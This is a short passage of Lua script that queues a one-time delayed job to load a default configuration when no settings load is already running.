end)

if not kscriptRecoveredFeatureConfigReloadQueued then
  Script.QueueJob(function()
    Script.Yield(1000)
    if not executingSettingsLoad then
      loadDefaultConfig()
    end
  end)
  kscriptRecoveredFeatureConfigReloadQueued = true
end